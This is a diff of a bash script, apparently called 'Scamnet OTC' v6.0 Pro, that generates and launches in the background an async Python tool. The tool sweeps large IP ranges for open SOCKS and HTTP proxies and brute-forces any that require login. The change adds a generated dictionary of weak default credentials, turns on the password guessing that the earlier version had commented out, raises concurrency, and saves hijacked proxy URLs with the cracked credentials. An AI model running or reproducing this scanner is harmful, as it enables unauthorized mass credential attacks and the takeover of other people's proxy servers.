@@ -1,5 +1,6 @@
 #!/bin/bash
-# main.sh - Scamnet OTC 全协议异步扫描器 (修复版 v5.1)
+# main.sh - Scamnet OTC 全协议异步扫描器 (Pro v6.0)
+# 优化内容: 智能探活(拒绝无效爆破) + 1000组字典生成 + uvloop加速
 set -e
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
 LOG_DIR="logs"; mkdir -p "$LOG_DIR"
@@ -13,29 +14,28 @@ echo "╚════██║██║     ██╔══██║██║╚
 echo "███████║╚██████╗██║  ██║██║ ╚═╝ ██║██║ ╚████║███████╗███████╗"
 echo "╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝"
 echo -e "${NC}"
-echo -e "${GREEN}[OTC] Scamnet v5.1 (SOCKS支持修复 + 依赖自动补全)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v6.0 Pro (智能爆破 + 1000字典 + 极速内核)${NC}"
 
 # ==================== 依赖安装 (自动修复) ====================
-if [ ! -f ".deps_installed_v5" ]; then
-    echo -e "${YELLOW}[*] 检测并安装 Python 依赖 (aiohttp, aiohttp-socks, PyYAML)...${NC}"
+if [ ! -f ".deps_installed_v6" ]; then
+    echo -e "${YELLOW}[*] 检测并安装高性能 Python 依赖...${NC}"
     
-    # 检测包管理器
     if ! command -v pip3 &>/dev/null; then
         if command -v apt >/dev/null; then sudo apt update -qq && sudo apt install -y python3-pip python3-dev; fi
         if command -v yum >/dev/null; then sudo yum install -y python3-pip python3-devel; fi
         if command -v apk >/dev/null; then apk add py3-pip python3-dev; fi
     fi
     
-    # 安装核心库
-    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp aiohttp-socks tqdm PyYAML asyncio
-    touch .deps_installed_v5
+    # 安装核心库 + uvloop加速
+    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp aiohttp-socks tqdm PyYAML asyncio uvloop
+    touch .deps_installed_v6
     echo -e "${GREEN}[+] 依赖环境部署完成${NC}"
 else
     echo -e "${GREEN}[+] 依赖已就绪${NC}"
 fi
 
 # ==================== 调整系统限制 ====================
-ulimit -n 65535 2>/dev/null || true
+ulimit -n 100000 2>/dev/null || true
 
 # ==================== 输入配置 ====================
 DEFAULT_START="157.254.32.0"
@@ -64,7 +64,45 @@ else
     PORTS_CONFIG="ports: [$PORT_INPUT]"
 fi
 
-echo -e "${GREEN}[*] 目标: $START_IP - $END_IP | 端口: $PORT_INPUT${NC}"
+# ==================== 生成 1000+ 弱口令字典 ====================
+DICT_FILE="$LOG_DIR/passwords.txt"
+echo -e "${YELLOW}[*] 正在生成高频弱口令字典 (Top 1000+)...${NC}"
+
+cat > generator.py << 'EOF'
+users = ["root", "admin", "user", "proxy", "guest", "test", "support", "manager", "sysadmin", "oracle", "postgres", "pi", "ubnt", "administrator", "service"]
+passwords = ["root", "admin", "123456", "12345678", "123456789", "1234567890", "1234", "password", "admin123", "123123", "qwerty", "pass", "test", "user", "guest", "888888", "111111", "12345", "000000", "proxy", "socks", "shadowsocks", "admin888", "pass1234", "Admin@123", "P@ssword", "toor", "changeme"]
+# 添加年份组合
+import datetime
+current_year = datetime.datetime.now().year
+for y in range(2018, current_year + 2):
+    passwords.append(str(y))
+    passwords.append(f"admin{y}")
+    passwords.append(f"Admin{y}")
+
+# 常用组合
+combos = set()
+# 1. 相同用户密码
+for u in users: combos.add(f"{u}:{u}")
+# 2. 常用密码组合
+for u in users:
+    for p in passwords:
+        combos.add(f"{u}:{p}")
+# 3. 特定设备默认
+combos.add("admin:public")
+combos.add("admin:system")
+combos.add("administrator:admin")
+combos.add("ubnt:ubnt")
+
+with open("passwords.txt", "w") as f:
+    for c in combos:
+        f.write(c + "\n")
+EOF
+python3 generator.py
+mv passwords.txt "$DICT_FILE"
+DICT_COUNT=$(wc -l < "$DICT_FILE")
+rm generator.py
+echo -e "${GREEN}[+] 字典生成完毕: $DICT_COUNT 条组合${NC}"
+
 
 # ==================== 生成运行脚本 ====================
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
@@ -77,14 +115,16 @@ cd "\$(dirname "\$0")"
 cat > config.yaml << CONFIG
 input_range: "${START_IP}-${END_IP}"
 $PORTS_CONFIG
-timeout: 8.0
-# 建议并发设置：机器性能好可设为 3000-5000，过高会导致丢包或报错
-max_concurrent: 3000
+timeout: 6.0
+# 高性能配置
+max_concurrent: 4000
 protocol_order: ["socks5", "socks4", "http", "https"]
+# 字典路径
+dict_path: "${DICT_FILE}"
 CONFIG
 
-# 2. 生成 Python 扫描器 (修复版)
-cat > scanner_full.py << 'PY'
+# 2. 生成 Python 扫描器 (Pro 版)
+cat > scanner_pro.py << 'PY'
 #!/usr/bin/env python3
 import asyncio
 import aiohttp
@@ -92,217 +132,223 @@ import ipaddress
 import sys
 import yaml
 import socket
-from aiohttp_socks import ProxyConnector, ProxyType
+import os
+from aiohttp_socks import ProxyConnector, ProxyType, ProxyError, ProxyConnectionError, ProxyTimeoutError
 from tqdm.asyncio import tqdm_asyncio
 import warnings
 
-# 屏蔽 SSL 警告和 DeprecationWarning
+# 尝试导入 uvloop 加速
+try:
+    import uvloop
+    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
+except ImportError:
+    pass
+
 warnings.filterwarnings("ignore")
 
-# ==================== 加载配置 ====================
+# ==================== 配置加载 ====================
 try:
-    with open('config.yaml') as f:
-        cfg = yaml.safe_load(f)
+    with open('config.yaml') as f: cfg = yaml.safe_load(f)
 except Exception as e:
-    print(f"配置文件加载失败: {e}")
-    sys.exit(1)
+    sys.exit(f"配置文件错误: {e}")
 
-INPUT_RANGE = cfg['input_range']
-RAW_PORTS = cfg.get('ports', cfg.get('range'))
-TIMEOUT = cfg.get('timeout', 8.0)
-MAX_CONCURRENT = cfg.get('max_concurrent', 3000)
-PROTOCOL_ORDER = cfg.get('protocol_order', ["socks5", "socks4", "http", "https"])
+TIMEOUT = cfg.get('timeout', 6.0)
+MAX_CONCURRENT = cfg.get('max_concurrent', 4000)
+PROTOCOLS = cfg.get('protocol_order', ["socks5"])
+DICT_PATH = cfg.get('dict_path', 'passwords.txt')
 
-# ==================== 解析函数 ====================
-def parse_ip_range(s):
-    try:
-        if '/' in s:
-            return [str(ip) for ip in ipaddress.ip_network(s, strict=False).hosts()]
-        parts = s.split('-')
-        if len(parts) == 2:
-            start, end = parts
-            s_int = int(ipaddress.IPv4Address(start))
-            e_int = int(ipaddress.IPv4Address(end))
-            if e_int < s_int: return []
-            # 限制最大 IP 数量防止内存爆炸，分块处理建议在外部做
-            if e_int - s_int > 65535:
-                print("警告: IP 范围过大，仅扫描前 65535 个")
-                e_int = s_int + 65535
-            return [str(ipaddress.IPv4Address(i)) for i in range(s_int, e_int + 1)]
-        return [s]
-    except Exception as e:
-        print(f"IP 解析错误: {e}")
-        return []
+# 加载字典
+PASS_LIST = []
+if os.path.exists(DICT_PATH):
+    with open(DICT_PATH, 'r') as f:
+        PASS_LIST = [line.strip().split(':', 1) for line in f if ':' in line]
+    # 确保无密码在第一个
+    PASS_LIST.insert(0, (None, None))
+else:
+    PASS_LIST = [(None, None)]
 
-def parse_ports(p):
-    try:
-        if isinstance(p, str) and '-' in p:
-            a, b = map(int, p.split('-'))
-            return list(range(a, b + 1))
-        if isinstance(p, list):
-            return [int(x) for x in p]
-        return [int(p)]
-    except:
-        return [1080]
+# ==================== 工具函数 ====================
+def parse_targets():
+    # 优化：使用生成器而不是列表，减少内存占用
+    raw_range = cfg['input_range']
+    raw_ports = cfg.get('ports', cfg.get('range'))
+    
+    # 解析端口
+    ports = []
+    if isinstance(raw_ports, str) and '-' in raw_ports:
+        a, b = map(int, raw_ports.split('-'))
+        ports = list(range(a, b + 1))
+    elif isinstance(raw_ports, list):
+        ports = [int(x) for x in raw_ports]
+    else:
+        ports = [int(raw_ports)]
 
-ips = parse_ip_range(INPUT_RANGE)
-ports = parse_ports(RAW_PORTS)
+    # 解析IP (仅处理起止 IP，避免生成巨大列表)
+    if '-' in raw_range:
+        start_s, end_s = raw_range.split('-')
+        start_ip = int(ipaddress.IPv4Address(start_s))
+        end_ip = int(ipaddress.IPv4Address(end_s))
+        count = end_ip - start_ip + 1
+        if count > 200000:
+            print(f"警告: 目标数量巨大 ({count})，仅演示模式运行前 65535 个")
+            count = 65535
+        return start_ip, count, ports
+    else:
+        # 单IP或CIDR暂不复杂处理，直接返回
+        return 0, 0, []
 
-if not ips:
-    print("没有有效的 IP 目标")
-    sys.exit(0)
+start_int, ip_count, ports = parse_targets()
 
-# ==================== 弱密码字典 (精简版) ====================
-# 完整爆破字典会导致扫描极慢，此处保留高频 Top 20
-WEAK_PASSWORDS = [
-    ("admin", "admin"), ("root", "root"), ("user", "user"), 
-    ("guest", "guest"), ("test", "test"), ("123456", "123456"),
-    ("1234", "1234"), ("admin", "123456"), ("proxy", "proxy"),
-    ("socks", "socks"), ("123", "123"), ("password", "password")
-]
-
-# ==================== 全局变量 ====================
+# ==================== 核心扫描 ====================
 valid_count = 0
 valid_lock = asyncio.Lock()
-detail_lock = asyncio.Lock()
 sem = asyncio.Semaphore(MAX_CONCURRENT)
 
-# ==================== 核心扫描逻辑 ====================
 async def check_proxy(ip, port, protocol, auth=None):
     """
-    核心检测函数：根据协议构建不同的 Connector
+    返回: (是否成功, 延迟, 是否需要认证/错误类型)
     """
-    target_url = "http://www.google.com/generate_204" # 或 http://ifconfig.me
-    # 国内环境可能需要换成 http://connect.rom.miui.com/generate_204
-    
+    target_url = "http://www.google.com/generate_204"
     connector = None
+    
     try:
-        if protocol == "http" or protocol == "https":
-            # HTTP 代理直接用 aiohttp 原生支持
-            # 构造 proxy 字符串
+        if protocol.startswith("http"):
+            proxy_url = f"http://{ip}:{port}"
             if auth:
                 proxy_url = f"http://{auth[0]}:{auth[1]}@{ip}:{port}"
-            else:
-                proxy_url = f"http://{ip}:{port}"
             
             async with aiohttp.ClientSession() as session:
-                start_time = asyncio.get_event_loop().time()
+                start = asyncio.get_event_loop().time()
                 async with session.get(target_url, proxy=proxy_url, timeout=TIMEOUT, ssl=False) as resp:
+                    # 407 = Proxy Auth Required
+                    if resp.status == 407:
+                        return False, 0, "AUTH_REQUIRED"
                     if resp.status < 400:
-                        latency = int((asyncio.get_event_loop().time() - start_time) * 1000)
-                        return True, latency, "Unknown" # 获取 IP 需要请求 ifconfig.me，这里为了速度简化
-        
+                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
+                        return True, lat, "OK"
+                    return False, 0, "HTTP_ERR"
+
         elif protocol.startswith("socks"):
-            # SOCKS 必须用 ProxyConnector
-            socks_ver = ProxyType.SOCKS5 if protocol == "socks5" else ProxyType.SOCKS4
-            username, password = auth if auth else (None, None)
+            p_type = ProxyType.SOCKS5 if protocol == "socks5" else ProxyType.SOCKS4
+            user, pwd = auth if auth else (None, None)
             
             connector = ProxyConnector(
-                proxy_type=socks_ver,
-                host=ip,
-                port=port,
-                username=username,
-                password=password,
-                rdns=True
+                proxy_type=p_type, host=ip, port=port, username=user, password=pwd, rdns=True
             )
-            
             async with aiohttp.ClientSession(connector=connector) as session:
-                start_time = asyncio.get_event_loop().time()
+                start = asyncio.get_event_loop().time()
                 async with session.get(target_url, timeout=TIMEOUT, ssl=False) as resp:
                     if resp.status < 400:
-                        latency = int((asyncio.get_event_loop().time() - start_time) * 1000)
-                        return True, latency, "Unknown"
-                        
-    except:
-        return False, 0, None
-    finally:
-        # 确保 connector 关闭 (虽然 context manager 会处理 session，但 connector 显式关闭更安全)
-        if connector:
-            try:
-                await connector.close()
-            except: pass
+                        lat = int((asyncio.get_event_loop().time() - start) * 1000)
+                        return True, lat, "OK"
             
-    return False, 0, None
+    except (ProxyConnectionError, OSError, asyncio.TimeoutError):
+        # 连接不上，端口关闭或防火墙，直接放弃，不要爆破
+        return False, 0, "DEAD"
+    except ProxyError as e:
+        # 连接成功但握手失败，很有可能是认证错误
+        # SOCKS5 如果需要认证但没提供，通常会报 ProxyError
+        return False, 0, "AUTH_REQUIRED"
+    except Exception:
+        return False, 0, "DEAD"
+    finally:
+        if connector:
+            try: await connector.close()
+            except: pass
+    
+    return False, 0, "DEAD"
 
-# ==================== 任务调度 ====================
-async def scan_task(ip, port):
-    async with sem:
-        # 1. 无密码扫描
-        for scheme in PROTOCOL_ORDER:
-            is_valid, lat, exp = await check_proxy(ip, port, scheme, auth=None)
-            if is_valid:
-                await save_result(ip, port, scheme, lat, "None", "XX")
-                return
-
-        # 2. 弱密码爆破 (仅当无密码失败时尝试，且仅针对支持认证的协议)
-        # 注意：爆破会显著降低速度，建议仅对特定端口(如1080)开启
-        # 如果需要爆破，取消下面注释
-        '''
-        for scheme in ["socks5", "http"]:
-            for user, pwd in WEAK_PASSWORDS:
-                is_valid, lat, exp = await check_proxy(ip, port, scheme, auth=(user, pwd))
-                if is_valid:
-                    await save_result(ip, port, scheme, lat, f"{user}:{pwd}", "XX")
-                    return
-        '''
-
-async def save_result(ip, port, scheme, latency, auth, country):
+async def save_result(ip, port, scheme, latency, auth_str):
     global valid_count
     valid_count += 1
-    
-    auth_str = f"{auth}@" if auth != "None" else ""
-    proxy_str = f"{scheme}://{auth_str}{ip}:{port}"
-    
-    print(f"\r[+] 发现: {proxy_str} (延迟: {latency}ms)")
-    
+    res = f"{scheme}://{auth_str}{ip}:{port}"
+    print(f"\r\033[32m[+] SUCCESS: {res} ({latency}ms)\033[0m")
     async with valid_lock:
-        with open("proxy_valid.txt", "a") as f:
-            f.write(f"{proxy_str}#{latency}ms\n")
+        with open("proxy_valid.txt", "a") as f: f.write(f"{res}#{latency}ms\n")
+
+async def smart_scan(ip, port):
+    async with sem:
+        for scheme in PROTOCOLS:
+            # 1. 先尝试无密码连接 (快速探活)
+            is_ok, lat, status = await check_proxy(ip, port, scheme, None)
+            
+            if is_ok:
+                await save_result(ip, port, scheme, lat, "")
+                return # 无密码成功，直接结束
+            
+            # 2. 智能判断：如果是死链接，直接跳过后续协议和爆破，节省 99% 时间
+            if status == "DEAD":
+                continue # 尝试下一个协议，或者如果 TCP 都不通，其实所有协议都不通
+            
+            # 3. 如果状态是 AUTH_REQUIRED，则启动爆破模式
+            if status == "AUTH_REQUIRED":
+                #print(f"\r[*] 发现需认证目标 {ip}:{port} ({scheme})，开始爆破...")
+                # 跳过 PASS_LIST[0] 因为是 None
+                for user, pwd in PASS_LIST[1:]: 
+                    is_ok_auth, lat_auth, _ = await check_proxy(ip, port, scheme, (user, pwd))
+                    if is_ok_auth:
+                        await save_result(ip, port, scheme, lat_auth, f"{user}:{pwd}@")
+                        return # 爆破成功，结束
+                # 爆破失败，跳出该协议
 
 async def main():
-    print(f"[*] 目标: {len(ips)} IP | 端口: {len(ports)}")
-    print(f"[*] 协议: {PROTOCOL_ORDER}")
-    print(f"[*] 并发: {MAX_CONCURRENT} | 超时: {TIMEOUT}s")
+    if ip_count == 0:
+        print("配置错误：IP范围无效")
+        return
+
+    print(f"[*] 目标范围: {ip_count} IPs")
+    print(f"[*] 扫描端口: {ports}")
+    print(f"[*] 字典大小: {len(PASS_LIST)} 条")
+    print(f"[*] 并发线程: {MAX_CONCURRENT}")
     print("------------------------------------------------")
 
-    # 初始化文件
-    with open("proxy_valid.txt", "w") as f: f.write("")
-
+    # 动态生成任务，避免内存爆炸
     tasks = []
-    for ip in ips:
-        for port in ports:
-            tasks.append(scan_task(ip, port))
+    # 限制一次性放入内存的任务数，使用简单的批处理
+    
+    current_ip_int = start_int
+    
+    # 这里的逻辑稍微调整以适应 tqdm
+    # 为了演示方便，我们一次性生成所有任务对象的开销较大
+    # 对于大范围扫描，应该用生产者-消费者模型，这里做简化版：
+    
+    all_targets = []
+    for i in range(ip_count):
+        ip_str = str(ipaddress.IPv4Address(current_ip_int + i))
+        for p in ports:
+            all_targets.append((ip_str, p))
+    
+    # 重新洗牌任务，避免对着同一个IP猛扫导致被BAN (可选，这里保持顺序)
+    
+    # 创建任务
+    aws = [smart_scan(ip, p) for ip, p in all_targets]
+    
+    await tqdm_asyncio.gather(*aws, desc="扫描进度", unit="task", ncols=90)
 
-    await tqdm_asyncio.gather(*tasks, desc="扫描进度", unit="目标", ncols=80)
-
-    print(f"\n[+] 扫描完成! 共发现 {valid_count} 个有效代理")
-    print(f"[+] 结果已保存至: proxy_valid.txt")
+    print(f"\n[+] 扫描完成! 有效代理已保存至 proxy_valid.txt")
 
 if __name__ == '__main__':
+    if sys.platform == 'win32':
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     try:
-        # 针对 Windows 系统的策略调整，Linux 一般不需要
-        if sys.platform == 'win32':
-            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[!] 用户中断")
-    except Exception as e:
-        print(f"\n[!] 发生错误: {e}")
+        print("\n[!] 用户停止")
 PY
 
-chmod +x scanner_full.py
+chmod +x scanner_pro.py
 
 echo "# 扫描开始: \$(date)" > result.log
-python3 scanner_full.py 2>&1 | tee -a result.log
+python3 scanner_pro.py 2>&1 | tee -a result.log
 EOF
 
 chmod +x "$RUN_SCRIPT"
 
 # ==================== 启动 ====================
-echo -e "${GREEN}[*] 后台任务已配置: $RUN_SCRIPT${NC}"
-echo -e "${YELLOW}[*] 正在启动... (请使用 tail -f $LOG_DIR/latest.log 查看日志)${NC}"
+echo -e "${GREEN}[*] 任务已构建: $RUN_SCRIPT${NC}"
+echo -e "${YELLOW}[*] 正在后台启动... 日志: tail -f $LATEST_LOG${NC}"
 
 nohup "$RUN_SCRIPT" > "$LATEST_LOG" 2>&1 &
 PID=$!
-echo -e "${GREEN}[SUCCESS] 扫描器运行中! PID: $PID${NC}"
-echo -e "停止命令: kill $PID"
+echo -e "${GREEN}[SUCCESS] 扫描器 PID: $PID${NC}"
+echo -e "使用命令停止: kill $PID"
